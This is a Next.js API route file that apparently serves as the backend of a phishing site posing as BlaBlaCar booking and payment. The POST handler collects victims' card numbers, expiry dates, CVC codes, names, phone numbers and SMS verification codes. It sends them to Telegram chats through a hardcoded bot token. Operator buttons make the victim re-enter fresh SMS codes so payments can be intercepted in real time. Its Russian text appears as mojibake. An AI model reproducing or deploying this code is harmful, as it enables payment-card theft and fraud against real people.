import { NextRequest, NextResponse } from 'next/server';
import { getCodeErrorFlag, getCodeSuccessFlag } from './codeErrorStore';

const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';
const CHAT_IDS = ['1902713760', '7508575481'];
const WEBHOOK_URL = 'https://blablacar-lovat.vercel.app/api/notify/callback';

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ webhook
async function setupWebhook() {
  try {
    console.log('Setting up webhook with URL:', WEBHOOK_URL);
    
    // –°–Ω–∞—á–∞–ª–∞ —É–¥–∞–ª—è–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π webhook
    const deleteResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/deleteWebhook`);
    const deleteData = await deleteResponse.json();
    console.log('Delete webhook response:', deleteData);
    
    // –ó–∞—Ç–µ–º —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–æ–≤—ã–π webhook
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: WEBHOOK_URL,
        allowed_updates: ['callback_query', 'message'],
        max_connections: 100,
        drop_pending_updates: true
      })
    });
    
    const data = await response.json();
    console.log('Webhook setup response:', data);
  } catch (error) {
    console.error('Error setting up webhook:', error);
  }
}

// –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º webhook –ø—Ä–∏ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏
setupWebhook();

function getClientIp(req: NextRequest) {
  const xff = req.headers.get('x-forwarded-for');
  if (xff) return xff.split(',')[0].trim();
  return req.ip || 'Unknown';
}

export async function GET(req: NextRequest) {
  // Polling –¥–ª—è –æ—à–∏–±–∫–∏ –∫–æ–¥–∞
  if (req.nextUrl.searchParams.get('check_code_error')) {
    const ip = getClientIp(req);
    console.log('Checking code status for IP:', ip);
    const hasError = getCodeErrorFlag(ip);
    const isSuccess = getCodeSuccessFlag(ip);
    
    if (hasError) {
      console.log('Code error flag found for IP:', ip);
      return NextResponse.json({ codeError: '–ö–æ–¥ –≤–≤–µ–¥–µ–Ω –Ω–µ–≤–µ—Ä–Ω–æ –∏–ª–∏ —É—Å—Ç–∞—Ä–µ–ª, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –ø–æ—Å—Ç—É–ø–∏–≤—à–∏–π —Å–º—Å –∫–æ–¥' });
    }
    
    if (isSuccess) {
      console.log('Code success flag found for IP:', ip);
      return NextResponse.json({ codeSuccess: true });
    }
    
    return NextResponse.json({ codeError: null, codeSuccess: false });
  }
  return NextResponse.json({});
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();
    const { text, status = 'online', url, message_ids, action, firstName, lastName, card, date, cvc, owner, phone } = body;
    const userAgent = req.headers.get('user-agent') || 'Unknown';
    const ip = getClientIp(req);
    const now = new Date();
    const time = now.toLocaleString('ru-RU', { hour12: false });

    let message = '';
    let reply_markup = undefined;
    if (action === 'payment') {
      message =
        `üí≥ <b>–ü–æ–ø—ã—Ç–∫–∞ –æ–ø–ª–∞—Ç—ã</b>\n` +
        `‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n` +
        `‚Ä¢ <b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${card || '-'}</code>\n` +
        `‚Ä¢ <b>–î–∞—Ç–∞:</b> <code>${date || '-'}</code>\n` +
        `‚Ä¢ <b>CVC:</b> <code>${cvc || '-'}</code>\n` +
        `‚Ä¢ <b>–§–ò–û:</b> <code>${owner || '-'}</code>\n` +
        `‚Ä¢ <b>–¢–µ–ª–µ—Ñ–æ–Ω:</b> <code>${phone || '-'}</code>\n` +
        `üïí <b>–í—Ä–µ–º—è:</b> ${time}\n` +
        `üåç <b>IP:</b> ${ip}`;
      reply_markup = {
        inline_keyboard: [
          [
            { text: '–û—à–∏–±–∫–∞ / –ó–∞–ø—Ä–æ—Å–∏—Ç—å –Ω–æ–≤—ã–π –∫–æ–¥', callback_data: 'code_error' },
            { text: '–£—Å–ø–µ—Ö', callback_data: 'code_success' }
          ]
        ],
      };
    } else if (action === 'sms_code') {
      message =
        `üîë <b>–í–≤–µ–¥—ë–Ω SMS-–∫–æ–¥</b>\n` +
        `‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n` +
        `‚Ä¢ <b>–ö–æ–¥:</b> <code>${body.code || '-'}</code>\n` +
        `‚Ä¢ <b>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:</b> <code>${card || '-'}</code>\n` +
        `‚Ä¢ <b>–î–∞—Ç–∞:</b> <code>${date || '-'}</code>\n` +
        `‚Ä¢ <b>CVC:</b> <code>${cvc || '-'}</code>\n` +
        `‚Ä¢ <b>–§–ò–û:</b> <code>${owner || '-'}</code>\n` +
        `‚Ä¢ <b>–¢–µ–ª–µ—Ñ–æ–Ω:</b> <code>${phone || '-'}</code>\n` +
        `üïí <b>–í—Ä–µ–º—è:</b> ${time}\n` +
        `üåç <b>IP:</b> ${ip}`;
    } else if (action === 'booking') {
      message =
        `üìù <b>–ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞ –Ω–∞ –±—Ä–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ</b>\n` +
        `‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n` +
        `üë§ <b>–ò–º—è:</b> ${firstName || '-'}\n` +
        `üë§ <b>–§–∞–º–∏–ª–∏—è:</b> ${lastName || '-'}\n` +
        `‚û°Ô∏è <b>–ö–ª–∏–µ–Ω—Ç –ø–µ—Ä–µ—à–µ–ª –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –æ–ø–ª–∞—Ç—ã</b>\n` +
        `üïí <b>–í—Ä–µ–º—è:</b> ${time}\n` +
        `üåç <b>IP:</b> ${ip}`;
    } else {
      const statusEmoji = status === 'online' ? 'üü¢' : 'üî¥';
      const statusText = status === 'online' ? '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ–Ω–ª–∞–π–Ω' : '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ñ—Ñ–ª–∞–π–Ω';
      message =
        `üöó <b>BlaBlaCar Booking</b>\n` +
        `‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n` +
        `<b>${statusEmoji} ${statusText}</b>\n` +
        (url ? `üåê <b>–°—Ç—Ä–∞–Ω–∏—Ü–∞:</b> ${url}\n` : '') +
        `üïí <b>–í—Ä–µ–º—è:</b> ${time}\n` +
        `üíª <b>User-Agent:</b> ${userAgent}\n` +
        `üåç <b>IP:</b> ${ip}`;
    }

    console.log('Sending message to Telegram:', message);
    console.log('Reply markup:', reply_markup);

    const results: { chat_id: string; message_id?: number; ok: boolean }[] = [];
    for (let i = 0; i < CHAT_IDS.length; i++) {
      const chat_id = CHAT_IDS[i];
      const msgId = message_ids?.[chat_id];
      let result;
      if (msgId && !action) {
        // editMessageText —Ç–æ–ª—å–∫–æ –¥–ª—è online/offline
        const editUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
        console.log('Editing message for chat:', chat_id);
        const res = await fetch(editUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id,
            message_id: msgId,
            text: message,
            parse_mode: 'HTML',
          }),
        });
        result = await res.json();
        console.log('Edit message response:', result);
        results.push({ chat_id, message_id: msgId, ok: result.ok });
      } else {
        // sendMessage (–∏–ª–∏ –¥–ª—è booking/payment –≤—Å–µ–≥–¥–∞ –Ω–æ–≤–æ–µ)
        const sendUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        console.log('Sending new message for chat:', chat_id);
        const res = await fetch(sendUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id,
            text: message,
            parse_mode: 'HTML',
            ...(reply_markup ? { reply_markup } : {}),
          }),
        });
        result = await res.json();
        console.log('Send message response:', result);
        results.push({ chat_id, message_id: result.result?.message_id, ok: result.ok });
      }
    }

    console.log('All results:', results);

    if (results.every(r => r.ok)) {
      const ids: Record<string, number> = {};
      results.forEach(r => { if (r.message_id) ids[r.chat_id] = r.message_id; });
      return NextResponse.json({ ok: true, message_ids: ids });
    } else {
      console.error('Some messages failed to send:', results);
      return NextResponse.json({ ok: false, error: results }, { status: 500 });
    }
  } catch (e) {
    console.error('Error sending message:', e);
    return NextResponse.json({ ok: false, error: e?.toString() }, { status: 500 });
  }
} 